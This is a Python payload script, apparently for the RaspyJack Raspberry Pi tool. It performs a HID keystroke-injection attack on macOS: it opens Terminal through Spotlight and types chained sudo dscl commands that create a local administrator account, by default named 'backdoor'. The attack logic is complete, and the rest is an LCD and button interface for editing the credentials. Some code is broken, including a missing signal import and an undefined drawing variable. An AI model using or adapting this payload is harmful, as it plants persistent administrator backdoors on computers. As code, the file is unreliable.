#!/usr/bin/env python3
import sys
sys.path.append('/root/Raspyjack/')
"""
RaspyJack *payload* – **HID Attack: Create Admin User (macOS)**
================================================================
A HID attack that attempts to create a new local administrator account
on a macOS machine.

**NOTE:** This requires the current user to have sudo privileges and will
likely require them to enter their password, making it a very noisy attack.
It is included for educational purposes.
"""

import os, sys, subprocess, time
sys.path.append(os.path.abspath(os.path.join(__file__, '..', '..')))
try:
    import RPi.GPIO as GPIO
    import LCD_1in44, LCD_Config
    from PIL import Image, ImageDraw, ImageFont
    HARDWARE_LIBS_AVAILABLE = True
except ImportError:
    HARDWARE_LIBS_AVAILABLE = False
    print("WARNING: RPi.GPIO or LCD drivers not available. UI will not function.", file=sys.stderr)

from hid_helper import hid_helper # Import the new HID helper

# --- CONFIGURATION ---
NEW_USERNAME = "backdoor" # Will be configurable
NEW_PASSWORD = "Password123!" # Will be configurable
FULL_NAME = "Local Admin" # Will be configurable

# --- GPIO & LCD ---
PINS = { "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26, "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16 }
if HARDWARE_LIBS_AVAILABLE:
    GPIO.setmode(GPIO.BCM)
    for pin in PINS.values(): GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)
    LCD = LCD_1in44.LCD()
    LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
    FONT_TITLE = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)
    FONT = ImageFont.load_default() # General purpose font
else:
    # Dummy objects if hardware libs are not available
    class DummyLCD:
        def LCD_Init(self, *args): pass
        def LCD_Clear(self): pass
        def LCD_ShowImage(self, *args): pass
    LCD = DummyLCD()
    class DummyGPIO:
        def setmode(self, *args): pass
        def setup(self, *args): pass
        def input(self, pin): return 1 # Simulate no button pressed
        def cleanup(self): pass
    GPIO = DummyGPIO()
    class DummyImageFont:
        def truetype(self, *args, **kwargs): return None
        def load_default(self): return None
    ImageFont = DummyImageFont()
    FONT_TITLE = ImageFont.load_default() # Fallback to default font
    FONT = ImageFont.load_default() # Fallback to default font

# --- Globals & Shutdown ---
running = True
current_username_input = NEW_USERNAME # For username input
username_input_cursor_pos = 0
current_password_input = NEW_PASSWORD # For password input
password_input_cursor_pos = 0
current_fullname_input = FULL_NAME # For full name input
fullname_input_cursor_pos = 0

def cleanup(*_):
    global running
    running = False

signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)

# --- UI ---
def show_message(lines, color="lime"):
    if not HARDWARE_LIBS_AVAILABLE:
        for line in lines:
            print(line)
        return
    LCD = LCD_1in44.LCD()
    LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
    image = Image.new("RGB", (128, 128), "BLACK")
    draw = ImageDraw.Draw(image)
    font = FONT_TITLE # Use FONT_TITLE for messages
    y = 40
    for line in lines:
        bbox = d.textbbox((0, 0), line, font=font)
        w, h = bbox[2] - bbox[0], bbox[3] - bbox[1]
        x = (128 - w) // 2
        d.text((x, y), line, font=font, fill=color)
        y += h + 5
    LCD.LCD_ShowImage(image, 0, 0)

def draw_ui(screen_state="main"):
    if not HARDWARE_LIBS_AVAILABLE:
        print(f"UI State: {screen_state}")
        if screen_state == "main":
            print(f"Username: {NEW_USERNAME}")
            print(f"Password: {NEW_PASSWORD}")
            print(f"Full Name: {FULL_NAME}")
        return

    img = Image.new("RGB", (128, 128), "black")
    d = ImageDraw.Draw(img)
    d.text((5, 5), "macOS Create User", font=FONT_TITLE, fill="#00FF00")
    d.line([(0, 22), (128, 22)], fill="#00FF00", width=1)
    
    if screen_state == "main":
        d.text((5, 30), "Username:", font=FONT, fill="white")
        d.text((5, 45), NEW_USERNAME[:16], font=FONT_TITLE, fill="yellow")
        d.text((5, 65), "Password:", font=FONT, fill="white")
        d.text((5, 80), NEW_PASSWORD[:16], font=FONT_TITLE, fill="yellow")
        d.text((5, 115), "OK=Start | KEY1=Edit User | KEY2=Edit Pass | KEY3=Exit", font=FONT, fill="cyan")
    elif screen_state == "username_input":
        d.text((5, 30), "Enter Username:", font=FONT, fill="white")
        display_username = list(current_username_input)
        if username_input_cursor_pos < len(display_username):
            display_username[username_input_cursor_pos] = '_'
        d.text((5, 50), "".join(display_username[:16]), font=FONT_TITLE, fill="yellow")
        d.text((5, 115), "UP/DOWN=Char | LEFT/RIGHT=Move | OK=Confirm", font=FONT, fill="cyan")
    elif screen_state == "password_input":
        d.text((5, 30), "Enter Password:", font=FONT, fill="white")
        display_password = list(current_password_input)
        if password_input_cursor_pos < len(display_password):
            display_password[password_input_cursor_pos] = '_'
        d.text((5, 50), "".join(display_password[:16]), font=FONT_TITLE, fill="yellow")
        d.text((5, 115), "UP/DOWN=Char | LEFT/RIGHT=Move | OK=Confirm", font=FONT, fill="cyan")
    elif screen_state == "fullname_input":
        d.text((5, 30), "Enter Full Name:", font=FONT, fill="white")
        display_fullname = list(current_fullname_input)
        if fullname_input_cursor_pos < len(display_fullname):
            display_fullname[fullname_input_cursor_pos] = '_'
        d.text((5, 50), "".join(display_fullname[:16]), font=FONT_TITLE, fill="yellow")
        d.text((5, 115), "UP/DOWN=Char | LEFT/RIGHT=Move | OK=Confirm", font=FONT, fill="cyan")
    elif screen_state == "attacking":
        d.text((5, 50), "Injecting Commands...", font=FONT_TITLE, fill="yellow")
        d.text((5, 70), f"User: {NEW_USERNAME}", font=FONT, fill="white")
        d.text((5, 115), "KEY3=Stop", font=FONT, fill="cyan")
    elif screen_state == "success":
        d.text((5, 50), "Attack Sent!", font=FONT_TITLE, fill="lime")
        d.text((5, 70), "Check target.", font=FONT, fill="white")
        d.text((5, 115), "KEY3=Exit", font=FONT, fill="cyan")
    elif screen_state == "failed":
        d.text((5, 50), "Attack FAILED!", font=FONT_TITLE, fill="red")
        d.text((5, 70), "Check console.", font=FONT, fill="white")
        d.text((5, 115), "KEY3=Exit", font=FONT, fill="cyan")
    elif screen_state == "hid_error":
        d.text((5, 40), "HID Gadget NOT", font=FONT_TITLE, fill="red")
        d.text((5, 60), "enabled!", font=FONT_TITLE, fill="red")
        d.text((5, 80), "See update_deps.py", font=FONT, fill="white")
        d.text((5, 115), "KEY3=Exit", font=FONT, fill="cyan")
    
    LCD.LCD_ShowImage(img, 0, 0)

def handle_text_input_logic(initial_text, screen_state_name, char_set):
    global current_username_input, username_input_cursor_pos, current_password_input, password_input_cursor_pos, current_fullname_input, fullname_input_cursor_pos
    
    if screen_state_name == "username_input":
        current_input_ref = current_username_input
        cursor_pos_ref = username_input_cursor_pos
    elif screen_state_name == "password_input":
        current_input_ref = current_password_input
        cursor_pos_ref = password_input_cursor_pos
    else: # fullname_input
        current_input_ref = current_fullname_input
        cursor_pos_ref = fullname_input_cursor_pos

    current_input_ref = initial_text
    cursor_pos_ref = len(initial_text) - 1
    
    draw_ui(screen_state_name)
    
    while running:
        btn = None
        for name, pin in PINS.items():
            if GPIO.input(pin) == 0:
                btn = name
                while GPIO.input(pin) == 0: # Debounce
                    time.sleep(0.05)
                break
        
        if btn == "KEY3": # Cancel input
            return None
        
        if btn == "OK": # Confirm input
            if current_input_ref: # Basic validation
                return current_input_ref
            else:
                show_message(["Input cannot", "be empty!"], "red")
                time.sleep(2)
                current_input_ref = initial_text
                cursor_pos_ref = len(initial_text) - 1
                draw_ui(screen_state_name)
        
        if btn == "LEFT":
            cursor_pos_ref = max(0, cursor_pos_ref - 1)
            draw_ui(screen_state_name)
        elif btn == "RIGHT":
            cursor_pos_ref = min(len(current_input_ref), cursor_pos_ref + 1)
            draw_ui(screen_state_name)
        elif btn == "UP" or btn == "DOWN":
            if cursor_pos_ref < len(current_input_ref):
                char_list = list(current_input_ref)
                current_char = char_list[cursor_pos_ref]
                
                try:
                    char_index = char_set.index(current_char)
                    if btn == "UP":
                        char_index = (char_index + 1) % len(char_set)
                    else: # DOWN
                        char_index = (char_index - 1 + len(char_set)) % len(char_set)
                    char_list[cursor_pos_ref] = char_set[char_index]
                    current_input_ref = "".join(char_list)
                except ValueError: # If current char is not in char_set
                    char_list[cursor_pos_ref] = char_set[0] # Default to first char
                    current_input_ref = "".join(char_list)
                draw_ui(screen_state_name)
        
        time.sleep(0.1)
    return None

# --- Main Attack Logic ---
def run_attack():
    global NEW_USERNAME, NEW_PASSWORD, FULL_NAME
    
    draw_ui("attacking")
    
    if not hid_helper.is_hid_gadget_enabled:
        draw_ui("hid_error")
        time.sleep(4)
        return False

    # Commands to create user and add to admin group
    cmd1 = f"sudo dscl . -create /Users/{NEW_USERNAME}"
    cmd2 = f"sudo dscl . -create /Users/{NEW_USERNAME} UserShell /bin/bash"
    cmd3 = f"sudo dscl . -create /Users/{NEW_USERNAME} RealName '{FULL_NAME}'"
    cmd4 = f"sudo dscl . -create /Users/{NEW_USERNAME} UniqueID 502" # May need to change
    cmd5 = f"sudo dscl . -create /Users/{NEW_USERNAME} PrimaryGroupID 20" # Staff group
    cmd6 = f"sudo dscl . -passwd /Users/{NEW_USERNAME} {NEW_PASSWORD}"
    cmd7 = f"sudo dscl . -append /Groups/admin GroupMembership {NEW_USERNAME}"

    # A single long command is better for HID attacks
    full_command = f"{cmd1}; {cmd2}; {cmd3}; {cmd4}; {cmd5}; {cmd6}; {cmd7}"
    
    try:
        hid_helper.press_modifier_key(hid_helper.keyboard.left_gui, hid_helper.keyboard.space) # Cmd+Space for Spotlight
        time.sleep(0.5)
        hid_helper.type_string("Terminal")
        hid_helper.press_key(hid_helper.keyboard.enter)
        time.sleep(0.75)
        hid_helper.type_string(full_command)
        hid_helper.press_key(hid_helper.keyboard.enter)
        
        draw_ui("success")
        return True
    except Exception as e:
        print(f"Error running HID attack: {e}", file=sys.stderr)
        draw_ui("failed")
        return False

# --- Execution ---
if __name__ == '__main__':
    if not HARDWARE_LIBS_AVAILABLE:
        print("ERROR: Hardware libraries (RPi.GPIO, LCD drivers, PIL) are not available. Cannot run HID macOS Create User.", file=sys.stderr)
        sys.exit(1)

    current_screen = "main"
    try:
        while running:
            if current_screen == "main":
                draw_ui("main")
                
                if GPIO.input(PINS["KEY3"]) == 0:
                    cleanup()
                    break
                
                if GPIO.input(PINS["OK"]) == 0:
                    if run_attack():
                        time.sleep(3) # Display success/failure
                    current_screen = "main"
                    time.sleep(0.3) # Debounce
                
                if GPIO.input(PINS["KEY1"]) == 0: # Edit Username
                    current_username_input = NEW_USERNAME
                    current_screen = "username_input"
                    time.sleep(0.3) # Debounce
                
                if GPIO.input(PINS["KEY2"]) == 0: # Edit Password
                    current_password_input = NEW_PASSWORD
                    current_screen = "password_input"
                    time.sleep(0.3) # Debounce
                
                if GPIO.input(PINS["RIGHT"]) == 0: # Edit Full Name (using RIGHT button for now)
                    current_fullname_input = FULL_NAME
                    current_screen = "fullname_input"
                    time.sleep(0.3) # Debounce
            
            elif current_screen == "username_input":
                char_set = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-"
                new_username = handle_text_input_logic(current_username_input, "username_input", char_set)
                if new_username:
                    NEW_USERNAME = new_username
                current_screen = "main"
                time.sleep(0.3) # Debounce
            
            elif current_screen == "password_input":
                char_set = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-=[]{}|;:,.<>?"
                new_password = handle_text_input_logic(current_password_input, "password_input", char_set)
                if new_password:
                    NEW_PASSWORD = new_password
                current_screen = "main"
                time.sleep(0.3) # Debounce
            
            elif current_screen == "fullname_input":
                char_set = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 .-"
                new_fullname = handle_text_input_logic(current_fullname_input, "fullname_input", char_set)
                if new_fullname:
                    FULL_NAME = new_fullname
                current_screen = "main"
                time.sleep(0.3) # Debounce
            
            time.sleep(0.1)
            
    except (KeyboardInterrupt, SystemExit):
        pass
    finally:
        if HARDWARE_LIBS_AVAILABLE:
            LCD.LCD_Clear()
            GPIO.cleanup()
        print("HID macOS Create User payload finished.")
